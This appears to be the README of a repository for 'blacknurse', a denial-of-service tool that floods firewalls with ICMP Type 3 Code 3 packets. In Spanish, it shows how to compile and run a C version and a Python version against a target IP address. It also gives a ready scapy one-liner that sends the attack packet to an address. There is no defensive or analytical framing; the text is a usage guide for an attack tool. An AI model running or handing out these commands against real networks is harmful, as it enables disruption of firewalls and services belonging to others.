# blacknurse
Black Nurse DOS Attack Firewall ( ICMP Type 3 Code 3 )

Ejecutar en c:
gcc blacknurse.c -o blacknurse
./blacknurse IP

Ejecutar en Python:
python blacknurse.py IP

Ejecutar con scapy: 
send(IP(dst="1.2.3.4")/ICMP(code=3,type=3))

